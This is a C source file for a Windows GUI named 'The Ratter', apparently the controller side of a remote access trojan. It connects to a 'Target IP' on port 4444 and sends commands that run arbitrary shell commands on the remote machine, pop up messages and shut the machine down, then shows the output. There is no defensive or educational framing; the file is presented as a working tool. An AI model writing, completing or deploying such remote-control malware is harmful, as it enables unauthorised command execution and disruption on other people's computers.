#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 4444

HWND hwndIpEdit, hwndMsgEdit, hwndCmdEdit, hwndOutput;
SOCKET sock = INVALID_SOCKET;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

int connect_to_server(const char *server_ip) {
    WSADATA wsaData;
    struct sockaddr_in serverAddr;

    if (sock != INVALID_SOCKET) {
        closesocket(sock);
        sock = INVALID_SOCKET;
    }

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        MessageBoxA(NULL, "WSAStartup failed", "Error", MB_OK | MB_ICONERROR);
        return 0;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        MessageBoxA(NULL, "Socket creation failed", "Error", MB_OK | MB_ICONERROR);
        WSACleanup();
        return 0;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = inet_addr(server_ip);

    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        sock = INVALID_SOCKET;
        WSACleanup();
        MessageBoxA(NULL, "Failed to connect to server", "Error", MB_OK | MB_ICONERROR);
        return 0;
    }

    return 1;
}

void send_command(const char *server_ip, const char *cmd) {
    char recvbuf[512];
    int recvlen;
    if (sock == INVALID_SOCKET) {
        if (!connect_to_server(server_ip)) return;
    }

    send(sock, cmd, (int)strlen(cmd), 0);
    recvlen = recv(sock, recvbuf, sizeof(recvbuf) - 1, 0);
    if (recvlen > 0) {
        recvbuf[recvlen] = '\0';
        SetWindowTextA(hwndOutput, recvbuf);
    } else {
        SetWindowTextA(hwndOutput, "No response or error");
    }
    closesocket(sock);
    sock = INVALID_SOCKET;
}

void AddControls(HWND hwnd) {
    CreateWindowA("static", "Target IP:", WS_VISIBLE | WS_CHILD, 20, 15, 80, 20, hwnd, NULL, NULL, NULL);
    hwndIpEdit = CreateWindowA("edit", "127.0.0.1", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 100, 15, 150, 20, hwnd, NULL, NULL, NULL);

    CreateWindowA("static", "Message to send:", WS_VISIBLE | WS_CHILD, 20, 50, 200, 20, hwnd, NULL, NULL, NULL);
    hwndMsgEdit = CreateWindowA("edit", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 20, 75, 300, 20, hwnd, NULL, NULL, NULL);
    CreateWindowA("button", "Send Message", WS_VISIBLE | WS_CHILD, 330, 75, 120, 25, hwnd, (HMENU)1, NULL, NULL);

    CreateWindowA("static", "Run Command:", WS_VISIBLE | WS_CHILD, 20, 110, 200, 20, hwnd, NULL, NULL, NULL);
    hwndCmdEdit = CreateWindowA("edit", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL, 20, 135, 300, 20, hwnd, NULL, NULL, NULL);
    CreateWindowA("button", "Run Command", WS_VISIBLE | WS_CHILD, 330, 135, 120, 25, hwnd, (HMENU)2, NULL, NULL);

    CreateWindowA("static", "Server Response:", WS_VISIBLE | WS_CHILD, 20, 170, 200, 20, hwnd, NULL, NULL, NULL);
    hwndOutput = CreateWindowA("edit", "", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_READONLY | ES_MULTILINE | WS_VSCROLL, 20, 195, 430, 80, hwnd, NULL, NULL, NULL);

    CreateWindowA("button", "Shutdown 60s", WS_VISIBLE | WS_CHILD, 20, 290, 120, 30, hwnd, (HMENU)3, NULL, NULL);
    CreateWindowA("button", "Shutdown Now", WS_VISIBLE | WS_CHILD, 150, 290, 120, 30, hwnd, (HMENU)4, NULL, NULL);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "RemoteClient";

    RegisterClassA(&wc);

    HWND hwnd = CreateWindowExA(0, "RemoteClient", "The Ratter by TomMustBe12", WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                               CW_USEDEFAULT, CW_USEDEFAULT, 480, 370, NULL, NULL, hInstance, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return (int)msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    char cmd[1024];
    char ip[64];
    switch (msg) {
    case WM_CREATE:
        AddControls(hwnd);
        break;

    case WM_COMMAND:
        GetWindowTextA(hwndIpEdit, ip, sizeof(ip));

        switch (LOWORD(wParam)) {
        case 1: // send msg button
            GetWindowTextA(hwndMsgEdit, cmd, sizeof(cmd));
            if (strlen(cmd) > 0) {
                char fullcmd[1100];
                snprintf(fullcmd, sizeof(fullcmd), "MSG %s", cmd);
                send_command(ip, fullcmd);
            }
            break;

        case 2: // run cmd button
            GetWindowTextA(hwndCmdEdit, cmd, sizeof(cmd));
            if (strlen(cmd) > 0) {
                char fullcmd[1100];
                snprintf(fullcmd, sizeof(fullcmd), "RUNCMD %s", cmd);
                send_command(ip, fullcmd);
            }
            break;

        case 3: // shutdown 60s
            send_command(ip, "SHUTDOWN 60");
            break;

        case 4: // shutdown now
            send_command(ip, "SHUTDOWN 0");
            break;
        }
        break;

    case WM_DESTROY:
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProcA(hwnd, msg, wParam, lParam);
    }
    return 0;
}
